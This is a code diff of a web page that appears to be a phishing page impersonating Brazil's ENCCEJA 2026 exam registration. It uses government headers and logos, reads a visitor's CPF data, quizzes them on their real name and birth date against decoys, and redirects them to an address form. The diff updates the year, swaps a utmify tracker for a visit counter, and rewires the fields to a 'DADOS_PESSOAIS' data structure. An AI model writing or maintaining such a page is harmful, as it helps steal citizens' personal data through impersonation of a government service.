@@ -4,19 +4,23 @@
 <head>
 <meta charset="UTF-8">
 <meta content="width=device-width, initial-scale=1.0" name="viewport">
-<title>ENCCEJA 2025 - Validação de Dados</title>
+<title>ENCCEJA 2026 - Validação de Dados</title>
 <script src="../../3.4-5.16"></script>
 <link href="../css/all.min-5.css" rel="stylesheet">
 <link href="../css/home-5.css" rel="stylesheet">
 <script src="../js/parametros-5.js"></script>
 <script src="../../scripts/utms/latest-5.js" data-utmify-prevent-subids="" async="" defer=""></script>
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+<script>
+    // Replace with your actual counter name
+    fetch('https://counterapi.com/api/hit/encceja')
+      .then(res => res.json())
+      .then(data => {
+        console.log('Total visits:', data.count);
+        // You can remove the console.log if you want no output at all
+      })
+      .catch(err => console.error('Visit counter error:', err));
+  </script>
+
 <style>
 .gov-header {
     background-color: #222222;
@@ -85,7 +89,7 @@ button#submit-button:not([disabled]):hover {
     document.addEventListener('DOMContentLoaded', function() {
         const cpfDataString = localStorage.getItem('cpfData');
         if (!cpfDataString) {
-            window.location.href = '../inscricao';
+            window.location.href = '../inicio/inscricao/';
             return;
         }
             
@@ -99,7 +103,7 @@ button#submit-button:not([disabled]):hover {
         submitBtn.addEventListener('click', function() {
             if (currentStep === 1) {
                 if (nomeSelecionado) {
-                    if (nomeSelecionado === userData.nome) {
+                    if (nomeSelecionado === userData.data.DADOS_PESSOAIS.NOME) {
                         showValidationStep(2);
                         fillDateOptions();
                     } else {
@@ -111,7 +115,7 @@ button#submit-button:not([disabled]):hover {
                 }
             } else if (currentStep === 2) {
                 if (dataSelecionada) {
-                    if (dataSelecionada === userData.nascimento) {
+                    if (dataSelecionada === userData.data.DADOS_PESSOAIS.DATA_NASCIMENTO) {
                         window.location.href = '../endereco/';
                     } else {
                         alert("Data de nascimento incorreta! Por favor tente novamente.");
@@ -125,7 +129,7 @@ button#submit-button:not([disabled]):hover {
     });
         
     function fillNameOptions() {
-        const options = [userData.nome, fakeName1, fakeName2];
+        const options = [userData.data.DADOS_PESSOAIS.NOME, fakeName1, fakeName2];
         shuffleArray(options);
             
         const nameOptions = document.getElementById('name-options');
@@ -148,7 +152,7 @@ button#submit-button:not([disabled]):hover {
     }
         
     function fillDateOptions() {
-        const options = [userData.nascimento, fakeDate1, fakeDate2];
+        const options = [userData.data.DADOS_PESSOAIS.DATA_NASCIMENTO, fakeDate1, fakeDate2];
         shuffleArray(options);
             
         const dateOptions = document.getElementById('date-options');
@@ -237,7 +241,7 @@ button#submit-button:not([disabled]):hover {
     <header class="gov-header text-white py-2">
         <div class="container mx-auto flex justify-between items-center px-4">
             <a class="font-bold text-sm" href="#">
-                <img src="./images/top_gov-5.jpg" alt="Logotipo" class="h-6">
+                <img src="../images/top_gov-5.jpg" alt="Logotipo" class="h-6">
             </a>
             <nav>
                 <ul class="flex space-x-4 text-[10px]">
@@ -259,7 +263,7 @@ button#submit-button:not([disabled]):hover {
     <main class="flex-grow py-8">
         <div class="container mx-auto px-4 max-w-3xl">
             <div class="text-center mb-6">
-                <img alt="Logo ENCCEJA 2026" class="mx-auto" height="100" src="./images/logo_encceja-5.png" width="390">
+                <img alt="Logo ENCCEJA 2026" class="mx-auto" height="100" src="../images/logo_encceja-5.png" width="390">
             </div>
             <div class="border border-gray-300 rounded">
                 <div class="form-header py-2 px-4 text-center">
